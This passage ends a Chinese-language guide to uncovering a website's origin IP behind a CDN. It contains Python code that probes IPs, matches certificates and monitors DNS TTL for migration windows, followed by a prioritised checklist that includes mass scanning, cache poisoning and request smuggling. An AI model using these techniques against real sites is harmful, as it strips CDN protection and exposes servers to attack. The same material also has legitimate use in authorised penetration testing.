                print(f"[+] 潜在源站IP: {ip} (响应与CDN节点不同)")
                print(f"    响应头: {result.stdout[:200]}")
                
                # 3. 检查证书
                cert_result = subprocess.run([
                    'openssl', 's_client', '-connect', f'{ip}:443',
                    '-servername', target, '-showcerts',
                ], capture_output=True, text=True, timeout=10, input='\n', text=True)
                
                if 'CN=' + target in cert_result.stdout:
                    print(f"[+] 证书验证通过: {ip} 持有目标域名证书 → 确认为源站!")
        except:
            pass
    
    def detect_cdn_migration_window(self, target: str):
        """检测CDN迁移窗口"""
        # CDN迁移窗口特征:
        # 1. DNS TTL降低 (准备切换)
        # 2. 新旧IP同时存在 (切换中)
        # 3. A记录数量变化 (配置变更)
        
        import dns.resolver
        
        resolver = dns.resolver.Resolver()
        
        # 检查TTL
        try:
            answers = resolver.resolve(target, 'A')
            ttl = answers.rrset.ttl
            
            if ttl < 300:  # TTL < 5分钟 → 可能准备切换
                print(f"[!] 检测到低TTL ({ttl}s) → 可能准备CDN切换")
                print(f"[*] 建议: 增加监控频率, 在切换窗口期捕获源站IP")
                
                # 高频监控 (每10秒)
                self.monitor_dns_changes(target, interval=10)
        except:
            pass
```
---
---

# 附录: 快速检查清单

```markdown
□ [ ] P0: 历史DNS记录 (SecurityTrails/DNSDB/ViewDNS)
□ [ ] P0: 子域名枚举 (含AltDNS/CT日志)
□ [ ] P0: IPv6记录 (很多站只给IPv4接了CDN)
□ [ ] P0: 基础DNS + CDN识别 (多解析器对比)
□ [ ] P1: 网络空间引擎 (Shodan/Censys/FOFA/Hunter)
□ [ ] P1: SSL证书搜索 (crt.sh/Censys证书指纹)
□ [ ] P1: 邮件头分析 (Received头/SPF/DKIM)
□ [ ] P2: Host头验证 (直接访问候选IP)
□ [ ] P2: 非标准端口扫描 (8080/8443/22/21/3389)
□ [ ] P2: 协议层绕过 (SSH/FTP/SMTP不经过CDN)
□ [ ] P3: 全网IP扫描 (ZMap/Masscan + 证书匹配)
□ [ ] P3: CDN缓存投毒/请求走私触发源站响应
□ [ ] P4: JA3/JA4 TLS指纹验证
□ [ ] P4: HTTP/2 Akamai指纹验证
□ [ ] P4: 页面哈希一致性验证
□ [ ] P4: 贝叶斯置信度评分 (P>0.8确认源站)
□ [ ] 2026新增: WebSocket握手溯源
□ [ ] 2026新增: gRPC/HTTP3 QUIC指纹
□ [ ] 2026新增: ML辅助源站识别
□ [ ] 2026新增: 暗网情报交叉验证
□ [ ] 2026新增: CDN配置变更窗口监控
```
---
## 版本历史

| 版本 | 日期 | 更新内容 |
|------|------|----------|
| v5.0 | 2026-01 | 50种方法/51家CDN/四维指纹/贝叶斯评分/全网扫描引擎 |
| v5.1 | 2026-02 | 融合FUCK-CDN P0-P4框架/12家厂商专项绕过 |
| v5.2 | 2026-03 | 深度强化: WebSocket溯源/gRPC指纹/HTTP3 QUIC |
| v5.3 | 2026-04 | 终极强化: 国内CDN专项/ML辅助/暗网情报/QUIC高级指纹 |
| v5.4 | 2026-07 | 独立提取版: 从全能技能集域B独立打包 |
